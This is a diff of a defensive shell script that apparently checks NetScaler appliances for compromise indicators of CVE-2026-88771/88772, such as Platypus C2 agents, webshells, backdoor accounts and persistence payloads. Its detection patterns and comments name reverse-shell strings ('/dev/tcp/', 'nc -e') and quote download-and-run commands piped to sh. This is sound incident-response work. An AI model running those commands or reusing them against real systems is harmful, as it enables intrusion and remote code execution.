     # v1.9: Arctic Wolf payload hashes, also in the places payloads are saved (/tmp, /var/tmp, top of / and /var)
-    for f in $( { find /tmp /var/tmp -maxdepth 3 -type f -size -2000k 2>/dev/null; find / /var -maxdepth 1 -type f -size -2000k 2>/dev/null; } | grep -v ctx697096); do
-      h=$(sha256 -q "$f" 2>/dev/null || sha256sum "$f" 2>/dev/null | awk '{print $1}')
-      case " $AW_HASHES $DY_HASHES " in *" $h "*) [ -n "$h" ] && COMP="$COMP
-known payload SHA-256 (Arctic Wolf / Unit 42): $f ($(fmtdate "$(mtime "$f")"))" ;; esac
+    for f in $( { find /tmp /var/tmp -maxdepth 3 -type f -size -2000k 2>/dev/null; find / /var -maxdepth 1 -type f -size -2000k 2>/dev/null; } | grep -v ctx697096 | hashfiles | hashmatch "$AW_HASHES $DY_HASHES"); do
+      COMP="$COMP
+known payload SHA-256 (Arctic Wolf / Unit 42): $f ($(fmtdate "$(mtime "$f")"))"
     done
     # WHIPSHOT (Mandiant): webshell code reading commands from HTTP_X_UX*, or eval/base64 on HTTP_NSC_CLIENTTYPE /
     # HTTP_NSC_LDAP. Not searched in NetScaler's own ns_gui PHP, which uses NSC_ headers legitimately.
@@ -792,7 +895,9 @@ WHIPSHOT-style webshell code (HTTP_X_UX / HTTP_NSC_* command headers, Mandiant):
 webshell key/token strings (Unit 42 .deb webshell): $(echo $F)"
     # SLAPSHOT tunnel (Mandiant): UXD_IDLE_EXIT in a running process environment or in dropped files
     F=$( { ps -axeww 2>/dev/null | grep 'UXD_IDLE_EXIT' | grep -vE 'grep|ctx697096' | cut -c1-160
-           grep -rlE 'UXD_IDLE_EXIT' /tmp /var/tmp 2>/dev/null | grep -v ctx697096; } | head -5)
+           # v1.10: regular files only - /tmp holds NetScaler's named pipes (.nscli_pipe, pitboss.debug ...) and
+           # FreeBSD grep -r reads them and waits forever (the v1.9 'hang'); big files (support bundles) skipped
+           find /tmp /var/tmp -type f -size -20000k 2>/dev/null | grep -v ctx697096 | xargs grep -lE 'UXD_IDLE_EXIT' 2>/dev/null; } | head -5)
     [ -n "$F" ] && COMP="$COMP
 SLAPSHOT tunnel marker UXD_IDLE_EXIT (Mandiant): $(echo $F | cut -c1-240)"
     # php_flag engine on / SetHandler for PHP in httpd.conf (Beazley, CERT-EU)
@@ -800,17 +905,18 @@ SLAPSHOT tunnel marker UXD_IDLE_EXIT (Mandiant): $(echo $F | cut -c1-240)"
     [ -n "$F" ] && COMP="$COMP
 httpd.conf enables PHP (php_flag engine on / SetHandler php): $F"
     # PHP / webshell code where no PHP belongs (catches renamed or modified webshells)
-    F=$(grep -rlE '<\?php|passthru[[:space:]]*\(|NSC_TASS' /var/netscaler/logon/LogonPoint/custom /var/vpn 2>/dev/null)
+    F=$(find /var/netscaler/logon/LogonPoint/custom /var/vpn -type f 2>/dev/null | xargs grep -lE '<\?php|passthru[[:space:]]*\(|NSC_TASS' 2>/dev/null)
     [ -n "$F" ] && COMP="$COMP
 PHP/webshell code in LogonPoint/custom or /var/vpn: $(echo $F)"
     # httpd alias exposing the webshell
-    F=$(grep -nHE 'receiver\\?\.min|^[[:space:]]*Alias(Match)?[[:space:]].*/\.[^/[:space:]]+[[:space:]]*$' /etc/httpd.conf /nsconfig/httpd.conf 2>/dev/null)
+    F=$(grep -nHE 'receiver\\?\.min|LogonUISimple\\?\.html\\?\.style|^[[:space:]]*Alias(Match)?[[:space:]].*/\.[^/[:space:]]+[[:space:]]*$' /etc/httpd.conf /nsconfig/httpd.conf 2>/dev/null)
     [ -n "$F" ] && COMP="$COMP
 httpd alias: $F"
     # files written by exploitation (canary / id dump) - proof that the injected command ran
     # (public watchTowr PoC examples write "id" output to /var/tmp; match by name and by content)
     F=$( { find /var/vpn /var/ns /netscaler/ns_gui /var/netscaler -name 'nx_verify.html' 2>/dev/null
            ls -d /var/tmp/wtw* /var/tmp/watchTowr* /var/tmp/boom* 2>/dev/null
+           find /netscaler/ns_gui /var/netscaler -maxdepth 3 -name 'id009*' 2>/dev/null
            find /var/tmp /tmp /var/vpn /var/netscaler/logon /netscaler/ns_gui/vpn -maxdepth 3 -type f -size -2k -mtime -30 2>/dev/null \
              | xargs grep -lE '^uid=[0-9]+\([a-z_]+\) gid=' 2>/dev/null
          } | sort -u)
@@ -826,22 +932,102 @@ marker files in /tmp from exploit tools (e.g. watchTowr CVE-2026-88772 DTLS tool
     F=$(ls -d /var/tmp/.nsmon /var/tmp/.nsmon/.cfg /var/tmp/.nsmon/.state /var/tmp/.nsmon/nsmon.pl /var/tmp/.s 2>/dev/null)
     [ -n "$F" ] && COMP="$COMP
 nsmon implant files (Arctic Wolf): $(for x in $F; do echo "$x ($(fmtdate "$(mtime "$x")"))"; done | tr '\n' ' ')"
-    F=$( { grep -nH 'nsmon' /etc/crontab /nsconfig/crontab /flash/nsconfig/crontab /var/cron/tabs/* 2>/dev/null; crontab -l 2>/dev/null | grep 'nsmon' | sed 's/^/root crontab: /'; } | cut -c1-200)
+    F=$( { grep -nHE 'nsmon\.pl|\.nsmon/' /etc/crontab /nsconfig/crontab /flash/nsconfig/crontab /var/cron/tabs/* 2>/dev/null; crontab -l 2>/dev/null | grep -E 'nsmon\.pl|\.nsmon/' | sed 's/^/root crontab: /'; } | cut -c1-200)
     [ -n "$F" ] && COMP="$COMP
 nsmon cron persistence (Arctic Wolf):
 $F"
-    F=$( { ps auxww 2>/dev/null | grep -E 'nsmon' | grep -vE 'grep|ctx697096' | cut -c1-200
+    # v1.10: only the implant itself (nsmon.pl, /var/tmp/.nsmon/) - plain 'nsmon' also matched NetScaler's own
+    # nsmonitor / custom Perl monitor processes (false positive reported on an HA pair)
+    F=$( { ps auxww 2>/dev/null | grep -E 'nsmon\.pl|\.nsmon/' | grep -vE 'grep|ctx697096' | cut -c1-200
            sockstat -4l 2>/dev/null | awk '$2 ~ /^perl/ && $6 ~ /:41[0-9][0-9][0-9]$/'; } )
     [ -n "$F" ] && COMP="$COMP
 nsmon process or Perl listener on port 41000-41999 (Arctic Wolf):
 $F"
+    # v1.10 (LevelBlue, 1 Oct): backdoor superuser account sec_monitor added to ns.conf, webshell hidden as
+    # LogonPoint/.local_journal, and the staging archive of /flash/nsconfig in /tmp (gone after a reboot)
+    F=$(grep -nHE '(add|bind) system user "?sec_monitor' /nsconfig/ns.conf /flash/nsconfig/ns.conf 2>/dev/null | sort -u | cut -c1-200)
+    [ -n "$F" ] && COMP="$COMP
+backdoor superuser account sec_monitor in ns.conf (LevelBlue):
+$F"
+    F=$( { find /var/netscaler/logon /netscaler/ns_gui /var/vpn -name '.local_journal*' 2>/dev/null; ls -d /tmp/update_result_*.tgz /var/tmp/update_result_*.tgz 2>/dev/null; } | sort -u)
+    [ -n "$F" ] && COMP="$COMP
+LevelBlue webshell / config staging archive: $(for x in $F; do echo "$x ($(wc -c < "$x" 2>/dev/null | tr -d ' ') bytes, $(fmtdate "$(mtime "$x")"))"; done | tr '\n' ' ')"
+    # v1.10 (TENEX, 30 Sep): Platypus C2 agent. Working folder /var/core/.ns-cache (client.crt + client.key = the
+    # agent enrolled with its C2), copies hidden as /netscaler.local/ns_*.pl, and a trojanised
+    # /var/python/bin/customsnmpd (a ~19 MB Go binary). Found by place, hash and content (its signing key).
+    F=$( { ls -d /var/core/.ns-cache /netscaler.local 2>/dev/null
+           ls /var/core/.ns-cache/client.crt /var/core/.ns-cache/client.key /var/core/.ns-cache/agent.lock /var/core/.ns-cache/state.db 2>/dev/null
+           find /netscaler.local -name 'ns_*.pl' 2>/dev/null; } | sort -u)
+    [ -n "$F" ] && COMP="$COMP
+Platypus C2 agent files (TENEX - client.crt/client.key mean it enrolled): $(echo $F)"
+    PL_HASHES="c98aee75c5e199c9b5527984ce48675d665963f7cab8ce9f2e82465de6b58727 89b64bd45478e53299f9c422cbba40fac3ac0712b551b85185e38203f7f984c6 be5832f3993ff63a36100b2f7b89c8d385e20dd9d72876700e7ade9fb9e6d4cb 0dcac605a3a0c37001552369a6a77003226b35ddee7710b554fcd0e6809a76d1 04db3fc44c81886844ef47949d7f352953a6bf1be4866be1fb3e7e12c452e3ac 2d2c2f6842982f7e1cb894ce915d39f2a9861009c7ecb1b90da803f2c3c608f4"
+    PLF=""
+    for f in $( { ls /var/python/bin/customsnmpd 2>/dev/null; find /var/core/.ns-cache /netscaler.local -type f 2>/dev/null
+                  find /tmp /var/tmp -maxdepth 2 -type f -size +2000k -size -60000k 2>/dev/null; } | sort -u); do
+      h=$(sha256 -q "$f" 2>/dev/null || sha256sum "$f" 2>/dev/null | awk '{print $1}')
+      case " $PL_HASHES " in *" $h "*) [ -n "$h" ] && { PLF="$PLF $f"; continue; } ;; esac
+      grep -qaF -e 'S8GEj/Ibzw/Zy9Z5u4saQyn0h59enf9Mk3J2m70tTMs=' -e 'platypus-agent' -e 'platypus://' "$f" 2>/dev/null && PLF="$PLF $f"
+    done
+    [ -n "$PLF" ] && COMP="$COMP
+Platypus C2 agent binary by hash or signing key (TENEX):$PLF"
+    # v1.10 (Arctic Wolf hash 927c7f..., strings via VirusTotal / Nextron THOR): the Platypus agent BOOTSTRAP script.
+    # Its hash differs per victim (a one-shot enrollment token is inside), so search small files for its fixed strings.
+    F=$( { find /tmp /var/tmp /netscaler.local /var/core -maxdepth 3 -type f -size -1024k 2>/dev/null
+           find / /var -maxdepth 1 -type f -size -1024k 2>/dev/null; } | grep -v ctx697096 | sort -u \
+         | xargs grep -laE "Platypus agent bootstrap|PLATYPUS_INGRESS_CA|AGENT_TOKEN='plt_" 2>/dev/null | head -5)
+    [ -n "$F" ] && COMP="$COMP
+Platypus agent bootstrap script by content (token per victim, so no fixed hash): $(for x in $F; do echo "$x ($(wc -c < "$x" | tr -d ' ') bytes, $(fmtdate "$(mtime "$x")"))"; done | tr '\n' ' ')"
+    # v1.10 (Nextron THOR rules, Florian Roth; Arctic Wolf/Unit 42 samples): generic obfuscated webshell code in ALL
+    # web-served folders. Hashes change per drop; these code forms do not: eval() around a decoder, eval/assert on
+    # request input, preg_replace with the /e modifier, create_function. Not used by NetScaler's own GUI code.
+    F=$(find /var/netscaler/logon /var/vpn /var/netscaler/gui /netscaler/ns_gui /netscaler/portal -type f -size -2000k 2>/dev/null \
+        | xargs grep -lE 'eval[[:space:]]*\([[:space:]]*(gzinflate|gzuncompress|gzdecode|str_rot13|base64_decode|strrev)[[:space:]]*\(|(eval|assert)[[:space:]]*\([[:space:]]*\$_(POST|GET|REQUEST|COOKIE)|preg_replace[[:space:]]*\([[:space:]]*.[^,]{0,80}/[imsxuADSUX]*e[imsxuADSUX]*.[[:space:]]*,|create_function[[:space:]]*\(' 2>/dev/null | head -10)
+    [ -n "$F" ] && COMP="$COMP
+obfuscated webshell code in a web-served folder (eval of gzinflate/base64/rot13, eval/assert on request input, preg_replace /e, create_function): $(echo $F)"
+    # Platypus runs under decoy process names; none of them exist on a normal NetScaler
+    F=$(ps axo pid=,comm= 2>/dev/null | awk '$2 ~ /^(system-health|health-monitor|sys-health|node-health|healthd)/')
+    [ -n "$F" ] && COMP="$COMP
+process with a Platypus decoy name (TENEX):
+$F"
+    # v1.10 (Deyda v9.43): admin-persistence payload - ONE file that adds and binds an admin user, sets the EPA default
+    # group to NO_AUTH (EPA scan effectively off), unbinds authentication/VPN policies and saves the config.
+    # Each command alone is normal admin work; all five together is an attacker batch file. Fast prefilter on NO_AUTH.
+    F=""
+    for f in $(find /var/tmp /tmp /nsconfig /flash/nsconfig -type f -size -1024k 2>/dev/null | grep -v ctx697096 | xargs grep -liE 'defaultEPAGroup[[:space:]]+NO_AUTH' 2>/dev/null); do
+      grep -qiE 'add[[:space:]]+system[[:space:]]+user[[:space:]]' "$f" && grep -qiE 'bind[[:space:]]+system[[:space:]]+user[[:space:]]' "$f" \
+        && grep -qiE 'set[[:space:]]+authentication[[:space:]]+epaAction.*-defaultEPAGroup[[:space:]]+NO_AUTH' "$f" \
+        && grep -qiE 'unbind[[:space:]]+(authentication[[:space:]]+(vserver|policylabel)|vpn[[:space:]]+vserver)' "$f" \
+        && grep -qiE 'save[[:space:]]+ns[[:space:]]+config' "$f" && F="$F $f"
+    done 2>/dev/null
+    [ -n "$F" ] && COMP="$COMP
+admin-persistence payload script (adds+binds a user, EPA NO_AUTH, unbinds auth policies, saves config - Deyda): $(for x in $F; do echo "$x ($(wc -c < "$x" | tr -d ' ') bytes, $(fmtdate "$(mtime "$x")"))"; done | tr '\n' ' ')"
+    # v1.10 (Wiz, Amitai Cohen, 1 Oct): what that payload leaves behind when the script itself is gone.
+    # A: EPA default group NO_AUTH in the saved config (current and older saved copies). NO_AUTH is the attacker's
+    # literal group name, not a NetScaler default: users that fail the EPA scan still get in.
+    F=$(ls /nsconfig/ns.conf /nsconfig/ns.conf.* 2>/dev/null | xargs grep -nHiE 'epaAction[[:space:]].*-defaultEPAGroup[[:space:]]+"?NO_AUTH' 2>/dev/null | cut -c1-200)
+    [ -n "$F" ] && COMP="$COMP
+EPA default group set to NO_AUTH in the saved config - EPA scan effectively off (Wiz admin-persistence payload):
+$F"
+    # D: the same commands in the CLI audit log. NetScaler logs every CLI command in ns.log as CMD_EXECUTED,
+    # also when it is run from the shell through cli_script.sh - so this still works after the script is deleted.
+    FIXREF=""; [ "$VULN_BUILD" = "no" ] && FIXREF="$FIXT"
+    # v1.10: the same pass also keeps failed management/NITRO logins (Command "login ... Status "ERROR), see below
+    CMDALL=$(catlogs /var/log/ns.log* | grep -aF 'CMD_EXECUTED' | grep -aiE 'Command "(login|add system user|bind system user|set authentication epaAction|unbind authentication (vserver|policylabel)|unbind vpn vserver|show ns runningConfig -outfile)')
+    CMDL=$(echo "$CMDALL" | grep -aivE 'Command "login' | grep -a . | fixtag "$FIXREF")
+    NLOGIN=$(echo "$CMDALL" | grep -aiE 'Command "login' | grep -aiE 'Status "ERROR')
+    F=$(echo "$CMDL" | grep -aiE 'defaultEPAGroup[[:space:]]+"?NO_AUTH' | grep -aiv 'Status "ERROR' | bfirst | head -5 | binsafe)
+    [ -n "$F" ] && COMP="$COMP
+EPA default group set to NO_AUTH by a CLI command in ns.log (Wiz admin-persistence payload):
+$F"
     # v1.7: files the known payloads drop (Gotham Technology Group)
     F=$( { ls -d /.x /s /tmp/s /var/tmp/s /lula /tmp/lula /var/tmp/lula /var/1.py 2>/dev/null
+           # v1.10: /v - written and run by a bot seen on 2 Oct (fetch -qo /v http://<host>:443/t/<hex>; sh /v)
+           for x in /v /tmp/v /var/tmp/v; do [ -f "$x" ] && echo "$x"; done
            find / /tmp /var/tmp -maxdepth 1 -name 'update_c*.pl' 2>/dev/null
            find /var/netscaler/logon/themes -maxdepth 1 -name 'wt88771*' 2>/dev/null
            ls -d /var/tmp/wtw888* 2>/dev/null; } | sort -u)
     [ -n "$F" ] && COMP="$COMP
-files dropped by known payloads (Gotham): $(for x in $F; do echo "$x ($(fmtdate "$(mtime "$x")"))"; done | tr '\n' ' ')"
+files dropped by known payloads (Gotham; /v: bot seen 2 Oct): $(for x in $F; do echo "$x ($(fmtdate "$(mtime "$x")"))"; done | tr '\n' ' ')"
     # Files the payloads write stolen data or loaders into (Gotham + Deyda). Contents are NOT
     # shown - they can hold configuration data. Preserve and inspect them securely.
     F=$(ls -d /var/netscaler/logon/insight-new.js /netscaler/ns_gui/admin_ui/e.txt /netscaler/ns_gui/admin_ui/log.txt \
@@ -911,7 +1097,7 @@ $F"
     [ -n "$F" ] && COMP="$COMP
 text/script files in Gateway client-package folders (should only hold packages/images):$F"
     # Live state (Gotham): payload processes and open connections to campaign infrastructure
-    F=$(ps auxww 2>/dev/null | grep -E 'lula|update_c|nsmon|xd7h|/\.x([[:space:]]|$)|/var/1\.py' | grep -vE 'grep|ctx697096')
+    F=$(ps auxww 2>/dev/null | grep -E 'lula|update_c|nsmon\.pl|\.nsmon/|xd7h|gs-netcat|gsocket|/\.ns-cache|/netscaler\.local|/\.x([[:space:]]|$)|/var/1\.py' | grep -vE 'grep|ctx697096')
     [ -n "$F" ] && COMP="$COMP
 payload process running now:
 $(echo "$F" | cut -c1-200)"
@@ -920,19 +1106,29 @@ $(echo "$F" | cut -c1-200)"
 open connection to campaign infrastructure NOW:
 $F"
     # attacker traffic in the logs (show the dated lines, tagged before/after the fix)
+    NIP=$(echo $GN_IPS | wc -w | tr -d ' '); NDOM=$(echo "$GN_DOM" | tr '|' '\n' | grep -c .); NOPP=$(echo "$OPP_IPRE" | tr '|' '\n' | grep -c .)
+    prog "[4/6] Logs: $NIP attacker IPs, $NDOM domains, ~$NOPP scanners"
     FIXREF=""; [ "$VULN_BUILD" = "no" ] && FIXREF="$FIXT"
+    # v1.10: ONE pass over the logs for all known IPs and domains, then split per IP. Up to v1.9 every IP was
+    # a full pass over all (compressed) logs - 42 passes, which took far too long on large MPX/VPX logs.
+    EARGS=""; for ip in $GN_IPS; do EARGS="$EARGS -e $ip"; done
+    for d in $(echo "$GN_DOM" | tr '|' ' ' | tr -d '\\'); do EARGS="$EARGS -e $d"; done
+    IPHITS=$(catlogs /var/log/httpaccess* /var/log/httperror* /var/log/ns.log* /var/log/messages* /var/log/notice.log* /var/log/nsvpn.log* 2>/dev/null | grep -aF $EARGS | grep -av 'shell_command=')
     for ip in $GN_IPS; do
-      F=$(zgrep -ahF "$ip" /var/log/httpaccess* /var/log/httperror* /var/log/ns.log* /var/log/messages* 2>/dev/null | grep -v 'shell_command=' | fixtag "$FIXREF")
+      [ -n "$IPHITS" ] || break
+      F=$(printf '%s\n' "$IPHITS" | grep -aF "$ip" | fixtag "$FIXREF")
       addtgt "known exploitation IP $ip" "$F" 3
     done
-    addtgt "attacker domains echvista.com (IFIN) / entretiensol.com (Arctic Wolf)" "$(zgrep -ahE "$GN_DOM" /var/log/httpaccess* /var/log/httperror* /var/log/ns.log* /var/log/messages* 2>/dev/null | grep -v 'shell_command=' | fixtag "$FIXREF")" 3
-    F=$(zgrep -ahE "(^|[^0-9.])($OPP_IPRE)([^0-9]|$)" /var/log/httpaccess* /var/log/httperror* /var/log/ns.log* 2>/dev/null | grep -v 'shell_command=' | fixtag "$FIXREF")
+    addtgt "attacker domains (IFIN, Arctic Wolf, TENEX: Platypus C2 and gsocket)" "$( [ -n "$IPHITS" ] && printf '%s\n' "$IPHITS" | grep -aE "$GN_DOM" | fixtag "$FIXREF")" 3
+    # v1.10: fast fixed-string search first, exact-boundary regex only on the lines that matched
+    EARGS=""; for ip in $(echo "$OPP_IPRE" | tr '|' ' ' | tr -d '\\'); do EARGS="$EARGS -e $ip"; done
+    F=$(catlogs /var/log/httpaccess* /var/log/httperror* /var/log/ns.log* 2>/dev/null | grep -aF $EARGS | grep -aE "(^|[^0-9.])($OPP_IPRE)([^0-9]|$)" | grep -av 'shell_command=' | fixtag "$FIXREF")
     if [ -n "$F" ]; then
       addtgt "opportunistic scanner IPs tagged by GreyNoise (hunting lead only - often residential/proxy, do not block on this alone)" "$F" 3
       TGT="$TGT
   IPs seen: $(echo "$F" | grep -oE "(^|[^0-9.])($OPP_IPRE)([^0-9]|$)" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort | uniq -c | sort -rn | head -6 | awk '{printf "%s x%s  ", $2, $1}')"
     fi
-    F=$(zgrep -ahE 'LogonPoint/custom/receiver\.min(\.[0-9a-f]+)?\.css|httpworkbench|NX-CVE-OK|nx_verify|wtw888|ns-88771-poc|PoCbit|c88771\.json|xua\.html|xd7h/|nsmon|update_c08937|/dev/tcp/|nc[[:space:]]+-e[[:space:]]|base64[[:space:]]+-w0|exec-ok|HTTP_X_UX|HTTP_NSC_(LDAP|CLIENTTYPE)|e826d7ddf3c85920' /var/log/httpaccess* /var/log/httperror* /var/log/ns.log* /var/log/messages* 2>/dev/null | grep -v 'shell_command=' | fixtag "$FIXREF")
+    F=$(zgrep -ahE 'LogonPoint/custom/receiver\.min(\.[0-9a-f]+)?\.css|httpworkbench|NX-CVE-OK|nx_verify|wtw888|ns-88771-poc|PoCbit|c88771\.json|xua\.html|xd7h/|nsmon\.pl|\.nsmon/|update_c08937|/dev/tcp/|nc[[:space:]]+-e[[:space:]]|base64[[:space:]]+-w0|exec-ok|HTTP_X_UX|HTTP_NSC_(LDAP|CLIENTTYPE)|e826d7ddf3c85920|NSC_TASS|gsocket|platypus-agent|/api/v1/agents/enroll|LogonUISimple\.html\.style\.min|;#[[:space:]]*NSX[0-9a-fA-F]|fetch(\$\{?IFS\}?|[[:space:]]|%20)+-q?o|:443/t/[0-9a-f]{6}|/api/v1/install/|AGENT_TOKEN|plt_[a-z0-9]{12,}\.' /var/log/httpaccess* /var/log/httperror* /var/log/ns.log* /var/log/messages* /var/log/nsvpn.log* 2>/dev/null | grep -v 'shell_command=' | fixtag "$FIXREF")
     addtgt "exploit strings (webshell alias, OOB domain, canary, payload files, reverse shells, webshell header names, scanner UA)" "$F" 8
     # v1.7 probe / recon markers (Gotham): 1-byte nsepa.deb pre-check (HTTP 206), vp_probe_nonexist,
     # scanner-probe logins. They show the box was found and tested.
@@ -967,6 +1163,7 @@ ${tg}${x%"${x#????????????????????}"}... -> $d"
       done
       IFS=$OIFS
     fi
+    prog "[5/6] Logs: webshell requests, payloads, shell history"
     # Mandiant/GTIG (29 Sep 2026): webshells disguised as client packages / signatures / icons
     # in the Gateway plugin folders, served via httpd.conf handlers for non-.php extensions.
     F=$(grep -nHiE 'Add(Handler|Type)[[:space:]]+["'"'"']?application/x-httpd-php["'"'"']?[[:space:]]+\.' /etc/httpd.conf /nsconfig/httpd.conf 2>/dev/null \
@@ -993,7 +1190,7 @@ tunnel artefacts (/tmp/.uxdport, /tmp/.uxdlock or python started from base64): $
     fi
     # v1.9 (Deyda v9.28): attack payloads in requests to the login pages, as recorded in the HTTP logs
     # (still visible after ns.log has rotated). Normal requests to these pages are not flagged.
-    addtgt "attack payload in a login-page request (HTTP logs)" "$(zgrep -ahiE '(/nf/auth/doAuthentication\.do|/cgi/login|/p/u/doLogon\.do|/logon/LogonPoint/tmindex\.html|/logon/LogonPoint/Authentication/GetUserName)[^[:cntrl:]]*(pitboss|NSPPE|PPE unexpectedly died|missed too many heartbeats|%3B|%60|\$\{IFS\}|curl[[:space:]]|wget[[:space:]]|fetch[[:space:]])' /var/log/httpaccess* /var/log/httperror* 2>/dev/null | fixtag "$FIXREF")" 3
+    addtgt "attack payload in a login-page request (HTTP logs)" "$(catlogs /var/log/httpaccess* /var/log/httperror* 2>/dev/null | grep -aiF -e doAuthentication -e /cgi/login -e doLogon -e tmindex -e GetUserName | grep -aiE '(/nf/auth/doAuthentication\.do|/cgi/login|/p/u/doLogon\.do|/logon/LogonPoint/tmindex\.html|/logon/LogonPoint/Authentication/GetUserName)[^[:cntrl:]]*(pitboss|NSPPE|PPE unexpectedly died|missed too many heartbeats|%3B|%60|\$\{IFS\}|curl[[:space:]]|wget[[:space:]]|fetch[[:space:]])' | fixtag "$FIXREF")" 3
     addtgt "errors for package/signature/icon files in Gateway folders (possible webshell staging)" "$(zgrep -ahiE '/vpns?/scripts/[^ ]*\.(deb|sig|php)|/vpn/media/[^ ]*\.ico' /var/log/httperror* 2>/dev/null | fixtag "$FIXREF")" 3
     # Webshells differ per appliance (Kevin Beaumont), so also look for PHP / shell scripts
     # in /netscaler/ns_gui written after boot (it is unpacked from the firmware at boot)
@@ -1049,13 +1246,18 @@ ${tg}$(echo "$x" | cut -c1-16)... -> $d"
     fi
     # Post-exploitation in shell history: LDAP credential theft via the bind account (Kevin Beaumont)
     addtgt "shell history with ldapsearch / openssl s_client / ns_gui/vpn (post-exploitation, check who ran it)" "$(zgrep -ahE 'ldapsearch|openssl[[:space:]]+s_client|ns_gui/vpn' /var/log/sh.log* /var/log/bash.log* 2>/dev/null | fixtag "$FIXREF")" 5
+    # v1.10 (LevelBlue): payloads kill the SNMP helper to cover their tracks
+    # v1.10: Platypus bootstrap download (curl .../api/v1/install/<token> | sh) in the shell history
+    addtgt "shell history downloading the Platypus agent bootstrap (/api/v1/install/, plt_ token)" "$(zgrep -ahE '/api/v1/install/|AGENT_TOKEN|plt_[a-z0-9]{12,}\.' /var/log/sh.log* /var/log/bash.log* 2>/dev/null | fixtag "$FIXREF")" 3
+    addtgt "shell history killing customsnmpd (covering tracks, LevelBlue - check who ran it)" "$(zgrep -ahE 'kill[^|;]*customsnmpd|customsnmpd[^|;]*kill|pkill[^|;]*snmp' /var/log/sh.log* /var/log/bash.log* 2>/dev/null | fixtag "$FIXREF")" 3
     # v1.7 key / config theft in shell history (Deyda triage script)
     addtgt "shell history touching keys / config / auth files (possible key or credential theft - check who ran it; if before the fix, rotate keys and passwords)" "$(zgrep -ahE '/flash/nsconfig/keys|F[12]\.key|database\.php|LDAPTLS_REQCERT|cp[[:space:]]+/usr/bin/bash|del[[:space:]]+/etc/auth\.conf' /var/log/sh.log* /var/log/bash.log* 2>/dev/null | fixtag "$FIXREF")" 5
     if [ -n "$COMP" ]; then
       susp "COMPROMISE indicators (CVE-2026-88771/88772) - an attacker ran commands on this box (follow CTX694799, rebuild, check the HA peer):"
       echo "$COMP" | grep -v '^$' | show 20
       note "Do NOT reboot or upgrade yet: copy this report, /var/log and the files above off the box first."
-      note "Then isolate it (fail over / firewall), disable HA sync, rebuild, rotate ALL secrets."
+      note "Snapshot a VPX and collect 'show techsupport' before anything else (CTX694799)."
+      note "Then isolate it (fail over / firewall), disable HA sync, rebuild, rotate ALL secrets incl. the KEK, and revoke the certificates."
       FOLLOWUP=1
     fi
     if [ -n "$TGT" ]; then
@@ -1073,11 +1275,12 @@ ${tg}$(echo "$x" | cut -c1-16)... -> $d"
       FOLLOWUP=1
     fi
     if [ -z "$COMP$TGT" ]; then
-      okay "No public CVE-2026-88771/88772 indicators (webshells, dropped files, persistence, 42 known attacker IPs + GreyNoise scanners, probe/canary/scanner strings)"
+      okay "No public CVE-2026-88771/88772 indicators (webshells, dropped files, persistence, $(echo $GN_IPS | wc -w | tr -d ' ') known attacker IPs + GreyNoise scanners, probe/canary/scanner strings)"
       note "/etc/httpd.conf is rebuilt at boot - an alias added before a reboot is gone from there, but the webshell file is not."
     fi
 
     # --- v1.7 live state and recent changes outside the web folders (Gotham) ------
+    prog "[6/6] Live state, users and saved configs"
     # Generic download / one-liner processes: NetScaler's own jobs use some of these, so [CHECK]
     F=$(ps auxww 2>/dev/null | grep -E 'curl|wget|perl -e|\| *perl|sh -c|(^|[[:space:]/])nc -' \
         | grep -vE 'grep|ctx697096|/netscaler/monitors/|showtechsupport|nsconmsg|pitboss_check|gotham_ioc' | cut -c1-200)
@@ -1085,6 +1288,89 @@ ${tg}$(echo "$x" | cut -c1-16)... -> $d"
     # Connections from the management plane to public addresses
     F=$(sockstat -4c 2>/dev/null | awk 'NR>1 && $7 !~ /^(10\.|192\.168\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|\*)/ {print}' | grep -viE 'nsppe')
     [ -n "$F" ] && { warn "Connections from the management plane to public addresses - check each is expected:"; echo "$F" | show 8; FOLLOWUP=1; }
+    # v1.10 (TENEX): customsnmpd replaced by a large Go binary
+    if [ -f /var/python/bin/customsnmpd ]; then
+      CS=$(wc -c < /var/python/bin/customsnmpd 2>/dev/null | tr -d ' ')
+      [ "${CS:-0}" -gt 10000000 ] && { warn "/var/python/bin/customsnmpd is $((CS / 1048576)) MB - TENEX saw it replaced by a ~19 MB Go binary (Platypus). Compare with a clean appliance of the same build:"; ls -l /var/python/bin/customsnmpd 2>/dev/null | show 1; FOLLOWUP=1; }
+    fi
+    # v1.10 (idea: Nextron THOR SUSP_Linux_Downloader): small scripts in temp folders that download AND run or make
+    # executable. Generic, so [CHECK]: support scripts can do this too. Path, size and date only.
+    F=$( { find /tmp /var/tmp -maxdepth 2 -type f -size -200k 2>/dev/null; find /var -maxdepth 1 -type f -size -200k 2>/dev/null; } \
+         | grep -v ctx697096 | sort -u | xargs grep -laE '(curl|wget|fetch)[[:space:]]' 2>/dev/null \
+         | xargs grep -laE '\|[[:space:]]*(ba|z)?sh([[:space:]]|$)|\|[[:space:]]*(perl|python[0-9.]*)([[:space:]]|$)|chmod[[:space:]]+([ugoa]*\+x|[0-7]*[1357][[:space:]])|nohup[[:space:]]' 2>/dev/null | head -10)
+    if [ -n "$F" ]; then
+      warn "Scripts in temp folders that download AND run something - check each one (generic downloader pattern, as in Nextron's THOR rules):"
+      for x in $F; do echo "$x ($(wc -c < "$x" 2>/dev/null | tr -d ' ') bytes, $(fmtdate "$(mtime "$x")"))"; done | show 10
+      FOLLOWUP=1
+    fi
+    # v1.10 (Deyda v9.43): stolen-config staging - copies of ns.conf or the key-encryption files in web or temp folders,
+    # and the config exports c1.txt / c2.txt / labels.txt seen with the admin-persistence payload. Contents not shown.
+    F=$( { find /var/vpn /var/netscaler/logon /var/netscaler/gui /netscaler/ns_gui /tmp /var/tmp -type f \( -name 'ns.conf' -o -name '.F1.key' -o -name '.F2.key' \) 2>/dev/null
+           ls -d /var/tmp/c1.txt /var/tmp/c2.txt /var/tmp/labels.txt 2>/dev/null; } | sort -u)
+    if [ -n "$F" ]; then
+      warn "Copies of ns.conf / key files or config exports in web or temp folders - check they are yours (contents not shown, may hold secrets):"
+      for x in $F; do echo "$x ($(wc -c < "$x" 2>/dev/null | tr -d ' ') bytes, $(fmtdate "$(mtime "$x")"))"; done | show 10
+      FOLLOWUP=1
+    fi
+    # v1.10 (LevelBlue, Wiz): attackers add their own admin account - no webshell, no file, no process needed.
+    # B: EVERY system user in the saved config (added locally, or only bound - e.g. an external/LDAP admin) besides nsroot, with the command policies bound to it and
+    # its groups (up to v1.10 beta only superuser accounts). Names only - password hashes are never shown.
